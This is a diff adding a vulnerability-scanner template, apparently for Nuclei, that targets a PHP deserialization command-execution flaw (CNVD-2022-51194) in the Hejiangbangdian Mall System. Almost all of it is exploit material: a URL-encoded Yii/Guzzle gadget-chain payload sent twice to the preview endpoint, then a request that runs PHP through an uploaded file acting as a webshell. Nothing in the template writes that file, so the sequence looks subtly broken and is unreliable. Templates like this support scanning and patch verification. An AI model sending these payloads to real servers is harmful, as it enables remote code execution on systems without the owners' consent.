@@ -1,0 +1,54 @@
+id: cnvd-2022-51194
+
+info:
+  name: Hejiangbangdian Mall System Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a command execution vulnerability in the preview method under the `api/testOrderSubmit` module of the Hejiangbangdian Mall System. The vulnerability is due to the failure to filter the parameters passed into unserialize, allowing an attacker to execute arbitrary commands or write malicious files to the server.
+  tags: command-execution
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-51194
+
+http:
+  - raw:
+      - |
+        POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+
+  - raw:
+      - |
+        POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+
+  - raw:
+      - |
+        POST /web/uploads/hejiang_1234.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        img=echo%20md5(123);
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
